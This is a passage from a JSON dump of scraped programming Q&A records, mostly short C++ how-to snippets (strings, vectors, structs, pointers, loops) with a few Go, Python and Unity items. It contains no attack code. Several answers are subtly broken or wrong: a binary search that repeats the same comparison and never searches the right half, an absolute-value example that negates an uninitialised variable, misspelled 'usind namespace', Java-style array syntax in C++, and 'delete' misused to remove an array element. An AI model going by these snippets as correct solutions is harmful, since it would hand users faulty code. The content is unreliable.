    "keyword": null,
    "link": null,
    "title": " how to convert string to int in c++",
    "description": "#include <iostream> #include <string>  int main() {      std::string str = \"123\";     int num;      // using stoi() to store the value of str1 to x     num = std::stoi(str);      std::cout << num;      return 0; }\nint thing = std::stoi(string);\n// For C++11 and later versions string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";   int myint1 = stoi(str1);  int myint2 = stoi(str2);  int myint3 = stoi(str3);   // Output stoi(\"45\") is 45 stoi(\"3.14159\") is 3 stoi(\"31337 geek\") is 31337 \n#include <iostream> #include <string> using namespace std; int main() {       string s = \"10\";       try     {         int i = stoi(s);         cout << i << '\\n';     }     catch (invalid_argument const &e)     {         cout << \"Bad input: std::invalid_argument thrown\" << '\\n';     }     catch (out_of_range const &e)     {         cout << \"Integer overflow: std::out_of_range thrown\" << '\\n';     }       return 0; }\natoi( str.c_str() )\nstring s = \"123\"; int n = s.size(); int num = 0;  for(int i = 0 ; i<n;i++)//this what stoi built function do XD  {   num = num*10+(s[i]-'0');  }\n",
    "reg_date": "2021-10-12T11:40:48.000Z"
  },
  {
    "id": 2375,
    "keyword": null,
    "link": null,
    "title": " how to copy one array to another in cpp",
    "description": "// credit to Stack Overflow user in the source link // C++ 11 and beyond  std::array<int,4> A = {10,20,30,40}; std::array<int,4> B = A; //copy array A into array B\n",
    "reg_date": "2021-10-12T11:40:49.000Z"
  },
  {
    "id": 2376,
    "keyword": null,
    "link": null,
    "title": " how to count words in c++?",
    "description": "int countWords(string str) {     // Input: Go Go Ganger   \t// Output: 3     stringstream s(str);      string word; // to store individual words     int count = 0;     while (s >> word)         count++;     return count; }\n",
    "reg_date": "2021-10-12T11:40:49.000Z"
  },
  {
    "id": 2377,
    "keyword": null,
    "link": null,
    "title": " how to cout in c++",
    "description": "#include <iostream>  using namespace std;  int main() { \tint a,b; \tchar str[] = \"Hello Programmers\"; \t \t/* Single insertion operator */ \tcout << \"Enter 2 numbers - \"; \tcin >> a >> b; \tcout << str; \tcout << endl; \t \t/* Multiple insertion operator */ \tcout << \"Value of a is \" << a << endl << \"Value of b is \" << b; \t \treturn 0; }\nstd::cout << \"Hello World!\" << std::endl; //Or you can do std::cout << \"Hello World!\" <<; //Only in some scenarios \n#include <iostream>  int main(){   std::cout << \"Hello World!\" << std::endl; // prints \"Hello World\" }\n",
    "reg_date": "2021-10-12T11:40:49.000Z"
  },
  {
    "id": 2378,
    "keyword": null,
    "link": null,
    "title": " how to create 2d array using vector in c++",
    "description": "// Create a vector containing n  //vectors of size m, all u=initialized with 0 vector<vector<int> > vec( n , vector<int> (m, 0));  \nvector<vector<int>> vec(N, vector<int> (M, INT_MAX));  Explanation:: vector<vector<int>> -- will take the formed container N -- Think like row of 2d Matrix vector<int> (M, INT_MAX) -- In each row, there is again a vector associated with it,  that will formed 2d array.\n2D vector\n",
    "reg_date": "2021-10-12T11:40:49.000Z"
  },
  {
    "id": 2379,
    "keyword": null,
    "link": null,
    "title": " how to create a c++ templeate",
    "description": "template <class myType> myType GetMax (myType a, myType b) {  return (a>b?a:b); }\n",
    "reg_date": "2021-10-12T11:40:49.000Z"
  },
  {
    "id": 2380,
    "keyword": null,
    "link": null,
    "title": " how to create a custom event in ue4 c++",
    "description": "Copy to clipboardUFUNCTION(BlueprintImplementableEvent) void DoSomething(); \n",
    "reg_date": "2021-10-12T11:40:49.000Z"
  },
  {
    "id": 2381,
    "keyword": null,
    "link": null,
    "title": " how to create a for loop in c++",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\n#include <iostream> using namespace std;  int main() { \tfor (int i = 0; i < 20; i++)     { \t\tcout << i << endl;     }   \t//prints the number (i) }\nfor ( int i = 0; i < 5; i++) {   cout << \"Hello\" << endl; } // prints hello 5 times. \n",
    "reg_date": "2021-10-12T11:40:49.000Z"
  },
  {
    "id": 2382,
    "keyword": null,
    "link": null,
    "title": " how to create a pair of double quotes in c++",
    "description": "int main() { \tcout << \"\\\" \\\"\" << endl;   \tsystem(\"pause\"):   \treturn 0; }\n",
    "reg_date": "2021-10-12T11:40:49.000Z"
  },
  {
    "id": 2383,
    "keyword": null,
    "link": null,
    "title": " how to create a struct in c++",
    "description": "struct Student {     string Nom;     int Surn;     int Age; };\n//Struct is a compound data type that contains different variables of different types. struct Student {     char stuName[30];     int stuRollNo;     int stuAge; }; \nstruct product {   int weight;   double price; } ;  product apple; product banana, melon;\n #include <bits/stdc++.h> #include <iostream>  #define ll long long  using namespace std;  struct student{ \tint roll; \tstring name; \tint age; \t \tvoid studentDetails(){ \t\tcout<<\"Name is \"<<name<<\" Age is \"<<age<<\" roll no is \"<<roll<<endl; \t} };   int main(){ \t \tstudent sumant; \tsumant.roll = 30; \tsumant.name = \"Sumant Tirkey\"; \tsumant.age = 18; \t \tsumant.studentDetails(); \tcout<<endl;      return 0; }\nstruct Person {     char name[50];     int age;     float salary; };\nstruct product {   int weight;   double price; } apple, banana, melon;\n",
    "reg_date": "2021-10-12T11:40:50.000Z"
  },
  {
    "id": 2384,
    "keyword": null,
    "link": null,
    "title": " how to create a vector in c++",
    "description": "// CPP program to create an empty vector  // and push values one by one.  #include <vector>  using namespace std; int main()  {      // Create an empty vector      vector<int> vect;       //add/push an integer to the end of the vector     vect.push_back(10);  \t//to traverse and print the vector from start to finish     for (int x : vect)          cout << x << \" \";      return 0;  }\n// First include the vector library: #include <vector>  // The syntax to create a vector looks like this: std::vector<type> name;  // We can create & initialize \"lol\" vector with specific values: std::vector<double> lol = {66.666, -420.69};  // it would look like this: 66.666 | -420.69\n#include <vector>  using namespace std;  int main(){   vector<int> v;   //vector<type> name      return 0; }\ntypedef std::vector<std::vector<double> > Matrix;  Matrix matrix = { {0.1,1.1,.2},                  {.4,.5,.6},                   {.8,.9,.10}                 }; // Just initilization: int rows = 3; int cols = 3; Matrix m3(rows, std::vector<double>(cols) );\nstd::vector<type> name;\n",
    "reg_date": "2021-10-12T11:40:50.000Z"
  },
  {
    "id": 2385,
    "keyword": null,
    "link": null,
    "title": " how to create an array of char in c++",
    "description": "// strings and NTCS: #include <iostream> #include <string> using namespace std;  int main () {   char question1[] = \"What is your name? \";   string question2 = \"Where do you live? \";   char answer1 [80];   string answer2;   cout << question1;   cin >> answer1;   cout << question2;   cin >> answer2;   cout << \"Hello, \" << answer1;   cout << \" from \" << answer2 << \"!\\n\";   return 0; }\n",
    "reg_date": "2021-10-12T11:40:50.000Z"
  },
  {
    "id": 2386,
    "keyword": null,
    "link": null,
    "title": " how to create an array with a variable in it c++",
    "description": "// arrays as parameters #include <iostream> using namespace std;  void printarray (int arg[], int length) {   for (int n=0; n<length; ++n)     cout << arg[n] << ' ';   cout << '\\n'; }  int main () {   int firstarray[] = {5, 10, 15};   int secondarray[] = {2, 4, 6, 8, 10};   printarray (firstarray,3);   printarray (secondarray,5); }\n",
    "reg_date": "2021-10-12T11:40:50.000Z"
  },
  {
    "id": 2387,
    "keyword": null,
    "link": null,
    "title": " how to create an enum in c++",
    "description": "enum season  {   spring = 0,      summer = 4,      autumn = 8,     winter = 12 };\n",
    "reg_date": "2021-10-12T11:40:50.000Z"
  },
  {
    "id": 2388,
    "keyword": null,
    "link": null,
    "title": " how to create an integer in c++",
    "description": "int num = 0;\n//Declare integer variable in C++ int x; //Initialize integer variable x = 1;  //Declaring and Initialize in same line int y = 0;\n",
    "reg_date": "2021-10-12T11:40:50.000Z"
  },
  {
    "id": 2389,
    "keyword": null,
    "link": null,
    "title": " how to declare 1-D array in C/C++",
    "description": "int arr[N] = {1, 2, 5};   // Datatype Array_name[size_of_array] = {value_of_elements}\n",
    "reg_date": "2021-10-12T11:40:50.000Z"
  },
  {
    "id": 2390,
    "keyword": null,
    "link": null,
    "title": " how to declare a 2d boolean vector in c++",
    "description": "vector< vector< bool > > verified( rows, vector<bool>( cols, false ) );\n",
    "reg_date": "2021-10-12T11:40:50.000Z"
  },
  {
    "id": 2391,
    "keyword": null,
    "link": null,
    "title": " how to declare a function in c++",
    "description": "// function example #include <iostream> using namespace std;  int addition (int a, int b) {   int r;   r=a+b;   return r; }\n",
    "reg_date": "2021-10-12T11:40:50.000Z"
  },
  {
    "id": 2392,
    "keyword": null,
    "link": null,
    "title": " how to declare a function in c++ header file",
    "description": "//somefile.h #ifndef SOMEFILE_H #define SOMEFILE_H int add(int a, int b); #endif\n",
    "reg_date": "2021-10-12T11:40:51.000Z"
  },
  {
    "id": 2393,
    "keyword": null,
    "link": null,
    "title": " how to declare a string c++",
    "description": "std::string str = \"hello world\";  char *str = \"hello world\"; char str[] = \"hello world\";  char str[11] = \"hello world\"; \n#include <iostream> #include <string>//for printing std::string int main()  { \t//A string is a group of characters and an array of const chars \tconst char* name = \"Caleb\";//C style string \t//how string actually works below: \t//String without null terminating character below:  \tchar name2[5] = { 'C','a','l','e','b' };// string is just an array of characters \t//The above doesn't have an null termination character at the end cout will not now where the string ends and will acess memory that is not a part of your string \tstd::cout << name2 << std::endl;//output => Caleb + somejunk //this is because null terminating char is not present at the end of array \t//String with null terminating character below:  \tchar name3[6] = { 'C','a','l','e','b','\\0' };//null terminating char '\\0' or '0' can be used  \tstd::cout << name3 << std::endl;//output => Caleb // because null terminating char is present cout knows where array ends   \t//std::string class in c++ is takes an array of const chars and a bunch of functions to manuplate it: \t//std::string has a constructor  that takes const char array \tstd::string name4 = \"Caleb\"; \tname4.size();//gives size of string and there are many more methods in std::string class \t   //appending to std::string      \t//\"Ever thing inside these double quotes becomes const char array\"    //std::string namee = \"Caleb\" +\"Hello\";//This will give error because adding const char array to const char array  \tstd::string namee = \"Caleb\"; \tnamee += \" Hello\";//This will work because adding a ptr to a actual string \tstd::cout << namee << std::endl; //You can also use the below \tstd::string namee2 = std::string(\"Caleb\")+\" Hello\";// This will work because constructor will convert const char array  to string, adding a ptr to string \tstd::cout << namee2 << std::endl;     std::cin.get();  }\n#include <string>  std::string myString = \"Hello, World!\";\n#include <string> #include <iostream> #include <type_traits> #include <cstring>  int main() {   std::string str = \"Hello, there\";   std::cout << std::boolalpha   << str.capacity() << \", \" << str.size() << \", \" << std::strlen(str.data()) // 12, 12, 12   << '\\n' << std::is_same_v<std::string, std::basic_string<char>> // true   << '\\n' << str.front() + str.substr(1, 10) + str.back() // Hello there   << '\\n' << str[0] // H   << '\\n';      str += \"!\";    std::cout << str << '\\n'; // Hello, there!   str.erase(4, 4); // Hellhere!   str.pop_back(); // Hellhere   str.insert(4, \" \"); // Hell here   std::cout << str << '\\n'; // Hell here    }\n   // Include the string library #include <string>  // Create a string variable std::string greeting = \"Hello\"; \nprintf(\"%s\\n\",someString.c_str());\n",
    "reg_date": "2021-10-12T11:40:51.000Z"
  },
  {
    "id": 2394,
    "keyword": null,
    "link": null,
    "title": " how to declare an enum variable c++",
    "description": "#include <iostream> using namespace std; enum direction {East, West, North, South}; int main(){    direction dir;    dir = South;     cout<<dir;       return 0; }\n",
    "reg_date": "2021-10-12T11:40:51.000Z"
  },
  {
    "id": 2395,
    "keyword": null,
    "link": null,
    "title": " how to declare an integer in c++",
    "description": "int num = 0;\n//Declare integer variable in C++ int x; //Initialize integer variable x = 1;  //Declaring and Initialize in same line int y = 0;\n   type variable = value; \n",
    "reg_date": "2021-10-12T11:40:51.000Z"
  },
  {
    "id": 2396,
    "keyword": null,
    "link": null,
    "title": " how to declare array in golang",
    "description": "var arr1 [3]int                                           //ARRAY syntax#1 \tarr2 := [2]string{\"Hello\", \"World\"}                       //ARRAY syntax#2 (composite literal)(identifier:= type{values}) \tarr3 := [...]int{12, 13, 14, 15, 16}                      //ARRAY syntax#3 \tarr4 := [5][2]int{{0, 0}, {1, 2}, {2, 4}, {3, 6}, {4, 8}} //ARRAY syntax#4 \tvar arr5 [4][3]int\t\t\t\t\t  //ARRAY syntax#4.1 \tarr5[0] = [3]int{1, 2, 3} \tarr5[1] = [3]int{4, 5, 6} \tarr5[2] = [3]int{7, 8, 9}  \tfmt.Println(arr1, arr2, arr3, arr4, arr5)\npackage main import \"fmt\"  func main() { \tvar x [5]int // An array of 5 integers  \tx[0] = 100 \tx[1] = 101 \tx[3] = 103 \tx[4] = 105  \tfmt.Printf(\"x[0] = %d, x[1] = %d, x[2] = %d\\n\", x[0], x[1], x[2]) \tfmt.Println(\"x = \", x) } \n",
    "reg_date": "2021-10-12T11:40:51.000Z"
  },
  {
    "id": 2397,
    "keyword": null,
    "link": null,
    "title": " how to declare function with multiple parameter c++",
    "description": "// overloaded function #include <iostream> using namespace std;  int operate (int a, int b) {   return (a*b); }  float operate (float a, float b) {   return (a/b); }  int main () {   int x=5,y=2;   float n=5.0,m=2.0;   cout << operate (x,y);   cout << \"\\n\";   cout << operate (n,m);   cout << \"\\n\";   return 0; } /* //Using template-> #include <iostream>  using namespace std;  template<typename Yourname> //U can write class instead of typename  void print (Yourname value) {     cout<<value;   }  int main() { print<int>(2);\t//you can also use-> print(2); cout<<endl; print(\"ali\"); } */\n",
    "reg_date": "2021-10-12T11:40:51.000Z"
  },
  {
    "id": 2398,
    "keyword": null,
    "link": null,
    "title": " how to define a while statement in c++",
    "description": "while(condition) {    statement(s); }\n",
    "reg_date": "2021-10-12T11:40:51.000Z"
  },
  {
    "id": 2399,
    "keyword": null,
    "link": null,
    "title": " how to define function prototypes in c++",
    "description": "/* C++ Function Prototype and C++ Function Definition */  #include<iostream.h> #include<conio.h> #include<stdlib.h>  int add(int, int);         // function prototype int subtract(int, int);    // function prototype int multiply(int, int);    // function prototype int divide(int, int);      // function prototype  void main() { \tclrscr(); \tint a, b; \tcout<<\"Enter any two number: \"; \tcin>>a>>b; \tcout<<\"\\nSummation = \"<<add(a, b); \tcout<<\"\\nSubtraction = \"<<subtract(a, b);   \tcout<<\"\\nMultiplication = \"<<multiply(a, b);  \tcout<<\"\\nDivision = \"<<divide(a, b);  \tgetch(); }  int add(int x, int y)     // function definition { \tint res; \tres = x + y; \treturn res; }  int subtract(int x, int y)    // function definition { \tint res; \tres = x - y; \treturn res; }  int multiply(int x, int y)    // function definition { \tint res; \tres = x * y; \treturn res; }  int divide(int x, int y)    // function definition { \tif(y==0) \t{ \t\tcout<<\"\\n\\nDivide by Zero Error..!!\"; \t\tcout<<\"\\nPress any key to exit...\"; \t\tgetch(); \t\texit(1); \t} \telse \t{ \t\tint res; \t\tres = x / y; \t\treturn res; \t} }\n",
    "reg_date": "2021-10-12T11:40:51.000Z"
  },
  {
    "id": 2400,
    "keyword": null,
    "link": null,
    "title": " how to define global array in c++ in a scope",
    "description": "class C {  int [] x;   void method A(int size)  {    x = new int[size];   // Allocate the array    for(int i = 0; i < size; i++)       x[i] = i;         // Initialise the elements (otherwise they contain random data)    B();    delete [] x;         // Don't forget to delete it when you have finished                         // Note strange syntax - deleting an array needs the []  }   void method B()  {    int n;    cin >> n;    cout << x[n];    // Be warned, if the user inputs a number < 0 or >= size,     // you will get undefined behaviour!   } }\n",
    "reg_date": "2021-10-12T11:40:51.000Z"
  },
  {
    "id": 2401,
    "keyword": null,
    "link": null,
    "title": " how to define range of numbers inside a if condition in c++",
    "description": "template <int min, int max> class range {   static bool contains(int i) { return min <= i  && i < max; } // In C++, ranges usually are half-open. };  int age = 23; if (range<18,30>::contains(age)) {  //Your desired code }\n",
    "reg_date": "2021-10-12T11:40:52.000Z"
  },
  {
    "id": 2402,
    "keyword": null,
    "link": null,
    "title": " how to delete a 2d dynamic array in c++",
    "description": "for (int i = 0; i < numRows; i++) {     delete [] world[i]; //    world[i] = 0;  // <- don't have to do this } delete [] world;  // <- because they won't exist anymore after this world = 0;\n",
    "reg_date": "2021-10-12T11:40:52.000Z"
  },
  {
    "id": 2403,
    "keyword": null,
    "link": null,
    "title": " how to delete a node c++",
    "description": "void del (node *before_del)  {     node* temp;     temp = before_del->next;     before_del->next = temp->next;     delete temp; } \n",
    "reg_date": "2021-10-12T11:40:52.000Z"
  },
  {
    "id": 2404,
    "keyword": null,
    "link": null,
    "title": " how to delete an element in vector pair in cpp",
    "description": "#include <iostream> #include <utility> #include <vector>  using namespace std;   int main() {     vector< pair<int, int> > v;     int N = 5;     const int threshold = 2;     for(int i = 0; i < N; ++i)         v.push_back(make_pair(i, i));      int i = 0;     while(i < v.size())         if (v[i].second > threshold)             v.erase(v.begin() + i);         else             i++;      for(int i = 0; i < v.size(); ++i)         cout << \"(\" << v[i].first << \", \" << v[i].second << \")\\n\";      cout << \"Done\" << endl; }\n",
    "reg_date": "2021-10-12T11:40:52.000Z"
  },
  {
    "id": 2405,
    "keyword": null,
    "link": null,
    "title": " how to delete pointer c++",
    "description": " int* ptr;\t\t\t// pointer declaration  ptr = new int;\t \t// dynamically allocate an integer on heap delete ptr;\t\t\t// deletes integer from heap & frees memory ptr = nullptr;\t\t// always good to reset pointer  ptr = new int[5];\t// dynamically allocate integer array on heap with size 5 delete[] ptr;\t\t// deletes integer array from heap & frees memory ptr = nullptr;\t\t// always good to reset pointer\n",
    "reg_date": "2021-10-12T11:40:52.000Z"
  },
  {
    "id": 2406,
    "keyword": null,
    "link": null,
    "title": " how to delete repeated  element in stack c++",
    "description": "int* stack = (int*)malloc(10 * sizeof(int)); int size = 10; int sp = -1;  bool isempty() {     return (sp == -1); }  bool isfull() {     return (sp == size - 1); }  void push(int x) {     if (isfull()) {         printf(\"Full!\");     }     else {         sp++;         stack[sp] = x;     } }  int pop() {     int x;     if (isempty()) {         printf(\"Empty!\");     }     else {         x = stack[sp];         sp--;     }     return x; }  void peek() {     if (!isempty()) {         printf(\"%d\", stack[sp]);     } }  void clear() {     while (!isempty()) {         pop();     } }  void print() {     if (!isempty()) {         for (int i = 0; i < sp+1; i++) {             printf(\"%d \", stack[i]);         }     }     printf(\"\\n\"); } \n",
    "reg_date": "2021-10-12T11:40:52.000Z"
  },
  {
    "id": 2407,
    "keyword": null,
    "link": null,
    "title": " how to delete something in an array c++",
    "description": "delete myarray[elemen];\n",
    "reg_date": "2021-10-12T11:40:52.000Z"
  },
  {
    "id": 2408,
    "keyword": null,
    "link": null,
    "title": " how to delete variable in c++",
    "description": "string* x = new string(); //... delete x;\n",
    "reg_date": "2021-10-12T11:40:52.000Z"
  },
  {
    "id": 2409,
    "keyword": null,
    "link": null,
    "title": " how to deny string input in c++",
    "description": "while( ! cin >> x){ //While cin failed to stream the data; Reads input then checks if cin has failed //Alternative: /* cin >> x; while(cin.fail()){ */    cin.clear(); //Reset the flags, so you can use cin again    cin.ignore(100, '\\n'); //Empty the buffer    cout << \"Please enter a number!\\n\"; /* If alternative is used:    cin >> x; //Read input again */ }\n",
    "reg_date": "2021-10-12T11:40:52.000Z"
  },
  {
    "id": 2410,
    "keyword": null,
    "link": null,
    "title": " how to determine the highest number in c++",
    "description": "#include <iostream> using namespace std;  int main() {     float n1, n2, n3;      cout << \"Enter three numbers: \";     cin >> n1 >> n2 >> n3;      if((n1 >= n2) && (n1 >= n3))         cout << \"Largest number: \" << n1;     else if ((n2 >= n1) && (n2 >= n3))         cout << \"Largest number: \" << n2;     else         cout << \"Largest number: \" << n3;          return 0; }\n",
    "reg_date": "2021-10-12T11:40:53.000Z"
  },
  {
    "id": 2411,
    "keyword": null,
    "link": null,
    "title": " how to disable buttons in unity",
    "description": "Button.interactable = false; // Uses Disabled Color And Cant Click It Button.enabled = false; // Does Not Use Disabled Color And Cant Click It Button.gameObject.SetActive(false); // Removes It From UI Entirely \n",
    "reg_date": "2021-10-12T11:40:53.000Z"
  },
  {
    "id": 2412,
    "keyword": null,
    "link": null,
    "title": " how to display a variable in c++",
    "description": "std::cout << variableName;\n",
    "reg_date": "2021-10-12T11:40:53.000Z"
  },
  {
    "id": 2413,
    "keyword": null,
    "link": null,
    "title": " how to display score using SDL in c++",
    "description": "int fontsize = 24; int t_width = 0; // width of the loaded font-texture int t_height = 0; // height of the loaded font-texture SDL_Color text_color = {0,0,0}; string fontpath = \"my font path\"; string text = \"text I want to display\"; TTF_Font* font = TTF_OpenFont(fontpath.c_str(), fontsize); SDL_Texture* ftexture = NULL; // our font-texture  // check to see that the font was loaded correctly if (font == NULL) {     cerr << \"Failed the load the font!\\n\";     cerr << \"SDL_TTF Error: \" << TTF_GetError() << \"\\n\"; } else {     // now create a surface from the font     SDL_Surface* text_surface = TTF_RenderText_Solid(font, text.c_str(), text_color);      // render the text surface     if (text_surface == NULL) {         cerr << \"Failed to render text surface!\\n\";         cerr << \"SDL_TTF Error: \" << TTF_GetError() << \"\\n\";     }     else {         // create a texture from the surface         ftexture = SDL_CreateTextureFromSurface(renderer, text_surface);          if (ftexture == NULL) {             cerr << \"Unable to create texture from rendered text!\\n\";         }         else {             t_width = text_surface->w; // assign the width of the texture             t_height = text_surface->h; // assign the height of the texture              // clean up after ourselves (destroy the surface)             SDL_FreeSurface(surface);         }     } } \n",
    "reg_date": "2021-10-12T11:40:53.000Z"
  },
  {
    "id": 2414,
    "keyword": null,
    "link": null,
    "title": " how to do binary search in c++ using STL",
    "description": "// BY shivam kumar KIIT #include<bits/stdc++.h> usind namespace std; int main() { \tint arr[]={10,2,34,2,5,4,1};   \tsort(arr,arr+7);//sort array in ascending order before using binary search   \tbinary_search(arr,arr+7,10);//return 1 as element is found   \tbinary_search(arr,arr+7,3);//return 0 as element is not found   \treturn 0; }\n#include<iostream> using namespace std; int binarySearch(int arr[], int p, int r, int num) {    if (p <= r) {       int mid = (p + r)/2;       if (arr[mid] == num)       return mid ;       if (arr[mid] > num)       return binarySearch(arr, p, mid-1, num);       if (arr[mid] > num)       return binarySearch(arr, mid+1, r, num);    }    return -1; } int main(void) {    int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};    int n = sizeof(arr)/ sizeof(arr[0]);    int num = 33;    int index = binarySearch (arr, 0, n-1, num);    if(index == -1)    cout<< num <<\" is not present in the array\";    else    cout<< num <<\" is present at index \"<< index <<\" in the array\";    return 0; }\n",
    "reg_date": "2021-10-12T11:40:53.000Z"
  },
  {
    "id": 2415,
    "keyword": null,
    "link": null,
    "title": " how to do decimal to binary converdsion in c++",
    "description": " // C++ program to convert a decimal  // number to binary number     #include <iostream>  using namespace std;     // function to convert decimal to binary  void decToBinary(int n)  {      // array to store binary number      int binaryNum[32];         // counter for binary array      int i = 0;      while (n > 0) {             // storing remainder in binary array          binaryNum[i] = n % 2;          n = n / 2;          i++;      }         // printing binary array in reverse order      for (int j = i - 1; j >= 0; j--)          cout << binaryNum[j];  }     // Driver program to test above function  int main()  {      int n = 17;      decToBinary(n);      return 0;  } \n// C++ program for decimal to binary   #include <iostream> #include <algorithm> #include <string> #include <vector>   using namespace std;   int main() {      vector<int>nums; // list that will hold binary values      int num = 0;      cout<<\"Number: \"<<endl;     cin>>num; // number input      int i=0; // iterator for vector      while(num!=0)     {         nums.push_back(num%2); // adds binary value to the back of string          i++; // i gets incremented for the next position in vector          num=num/2;      }       reverse(nums.begin(),nums.end()); // reverses order of vector         for(auto x:nums)     {         cout<<x; // outputs stuff in vector      }   return 0;  }\n",
    "reg_date": "2021-10-12T11:40:53.000Z"
  },
  {
    "id": 2416,
    "keyword": null,
    "link": null,
    "title": " how to do if command in c++",
    "description": "#include <iostream>  include namespace std;  int main() { \tint flourBagCount = 16;   \tif (flourBagCount < 15) { \t\tcout << \"There are not enough bags of flour in inventory.\" \t} else { \t\tcout << \"There are enough bags of flour in inventory.\" \t} }\n",
    "reg_date": "2021-10-12T11:40:53.000Z"
  },
  {
    "id": 2417,
    "keyword": null,
    "link": null,
    "title": " how to downgrade numpy",
    "description": "pip install --upgrade numpy==1.10.1 \n",
    "reg_date": "2021-10-12T11:40:53.000Z"
  },
  {
    "id": 2418,
    "keyword": null,
    "link": null,
    "title": " how to download c++ portable compiler",
    "description": "portable C++ compiler for windows: https://winlibs.com/ Download the  7-Zip archive version\n",
    "reg_date": "2021-10-12T11:40:53.000Z"
  },
  {
    "id": 2419,
    "keyword": null,
    "link": null,
    "title": " how to dynamically allocate an array c++",
    "description": "int main() {   int size;    std::cin >> size;    int *array = new int[size];    delete [] array;    return 0; }\nint* a = NULL;   // Pointer to int, initialize to nothing. int n;           // Size needed for array cin >> n;        // Read in the size a = new int[n];  // Allocate n ints and save ptr in a. for (int i=0; i<n; i++) {     a[i] = 0;    // Initialize all elements to zero. } . . .  // Use a as a normal array delete [] a;  // When done, free memory pointed to by a. a = NULL;     // Clear a to prevent using invalid memory reference. \n",
    "reg_date": "2021-10-12T11:40:54.000Z"
  },
  {
    "id": 2420,
    "keyword": null,
    "link": null,
    "title": " how to empty an array c++",
    "description": "std::fill_n(array, elementCount, 0); \n",
    "reg_date": "2021-10-12T11:40:54.000Z"
  },
  {
    "id": 2421,
    "keyword": null,
    "link": null,
    "title": " how to encode utf-8 cpp",
    "description": "#include <iostream> #include <string> #include <locale> #include <codecvt>   int main() {     // UTF-8 data. The character U+1d10b, musical sign segno, does not fit in UCS2     std::string utf8 = u8\"z\\u6c34\\U0001d10b\";       // the UTF-8 / UTF-16 standard conversion facet     std::wstring_convert<std::codecvt_utf8_utf16<char16_t>, char16_t> utf16conv;     std::u16string utf16 = utf16conv.from_bytes(utf8);     std::cout << \"UTF16 conversion produced \" << utf16.size() << \" code units:\\n\";     for (char16_t c : utf16)         std::cout << std::hex << std::showbase << c << '\\n';  }\n",
    "reg_date": "2021-10-12T11:40:54.000Z"
  },
  {
    "id": 2422,
    "keyword": null,
    "link": null,
    "title": " how to end a c++ program early",
    "description": "void func( bool d ) {     if( ! ( d ) )         return;      //Load of code here that you don't want to execute if the above is incorrect. }\n",
    "reg_date": "2021-10-12T11:40:54.000Z"
  },
  {
    "id": 2423,
    "keyword": null,
    "link": null,
    "title": " how to ensure the user inouts a int and not anything else c++",
    "description": "int x;     std::cin >> x;     while(std::cin.fail()) {         std::cout << \"Error\" << std::endl;         std::cin.clear();         std::cin.ignore(256,'\\n');         std::cin >> x;     }\n",
    "reg_date": "2021-10-12T11:40:54.000Z"
  },
  {
    "id": 2424,
    "keyword": null,
    "link": null,
    "title": " how to erase duplicates from vector",
    "description": "sort( vec.begin(), vec.end() ); vec.erase( unique( vec.begin(), vec.end() ), vec.end() );\nsort( vec.begin(), vec.end() ); vec.erase( unique( vec.begin(), vec.end() ), vec.end() ); \nsort( res.begin(), res.end() ); res.erase( unique( res.begin(), res.end() ), res.end() );  SYNTAX:  ForwardIterator unique (ForwardIterator first, ForwardIterator last);  first: Forward iterator to the first element in the container. last: forward iterator to the last element in the container.\n",
    "reg_date": "2021-10-12T11:40:54.000Z"
  },
  {
    "id": 2425,
    "keyword": null,
    "link": null,
    "title": " how to erase element from multiset c++",
    "description": "#include <iostream> #include <set>  int main() { \tstd::multiset<int>ms;   \tms.insert(1);   \tms.insert(1);   \tms.insert(2);   \tms.insert(2);   \tms.insert(3);   \tms.insert(3);   \tfor(auto& it : ms) { \t\tstd::cout<<it<<' ';     }   \tstd::cout<<'\\n';   \tms.erase(2); // erases all elements with value 2   \tfor(auto& it : ms) { \t\tstd::cout<<it<<' ';     }   \tstd::cout<<'\\n';   \tms.erase(ms.begin()); // erases first element   \tfor(auto& it : ms) { \t\tstd::cout<<it<<' ';     }   \tstd::cout<<'\\n';   \tms.erase(ms.find(3)); // erases only one element with value 3   \tfor(auto& it : ms) { \t\tstd::cout<<it<<' ';     } \treturn 0; } \n",
    "reg_date": "2021-10-12T11:40:54.000Z"
  },
  {
    "id": 2426,
    "keyword": null,
    "link": null,
    "title": " how to extract a folder using python",
    "description": "pip install patool import patoolib  #case 1 specific output path patoolib.extract_archive(\"filename.rar\", outdir=\"outputpath\")  #case 2 current working directory patoolib.extract_archive(\"filename.rar\")  \n",
    "reg_date": "2021-10-12T11:40:54.000Z"
  },
  {
    "id": 2427,
    "keyword": null,
    "link": null,
    "title": " how to fill array element in c++",
    "description": "fill(arr,arr+n,0)\n",
    "reg_date": "2021-10-12T11:40:54.000Z"
  },
  {
    "id": 2428,
    "keyword": null,
    "link": null,
    "title": " how to find 2d vector length cpp",
    "description": "myVector[   Vector[0, 4, 2, 5],   Vector[1, 4, 2] ];  /*When you call for myVector[1].size() it would return 3 and [0] would return 4.  For the amount of rows (int vectors) in the 2d vector, you can just use myVector.size()  You can run this to see it in actions*/\n",
    "reg_date": "2021-10-12T11:40:55.000Z"
  },
  {
    "id": 2429,
    "keyword": null,
    "link": null,
    "title": " how to find a integer is how many times repeated in C++ without for loop",
    "description": "#include <iostream> #include <vector> #include <algorithm>  using namespace std;  int main(void) {    vector<int> v = {1, 3, 3, 3, 3};    int cnt;     cnt = count(v.begin(), v.end(), 3);     cout << \"Number 3 occurs \" << cnt << \" times.\" << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:40:55.000Z"
  },
  {
    "id": 2430,
    "keyword": null,
    "link": null,
    "title": " how to find absolute value in c++",
    "description": "#include <iostream> #include <cstdlib> using namespace std;  int main() { \tint x = -5; \tlong y = -2371041;  \tint a = abs(x); \tlong b = abs(y);  \tcout << \"abs(\" << x << \") = |\" << x << \"| = \" << a << endl; \tcout << \"abs(\" << y << \") = |\" << y << \"| = \" << b << endl; }  /* output abs(-5) = |-5| = 5 abs(-2371041) = |-2371041| = 2371041*/\n[Mathematics] |x| = abs(x) [C++ Programming]\n#include <iostream>#include <conio.h>using namespace std;int main (){    int Number;    Number=34;    int absoulteval;    if (Number<0)    absoulteval=-absoulteval;    else     absoulteval=Number;    cout<<\"The Absolute value of \"<<Number<<\" is \" absoultevalue:    return 0;}\n",
    "reg_date": "2021-10-12T11:40:55.000Z"
  },
  {
    "id": 2431,
    "keyword": null,
    "link": null,
    "title": " how to find all permutations of n distinct integers in c++",
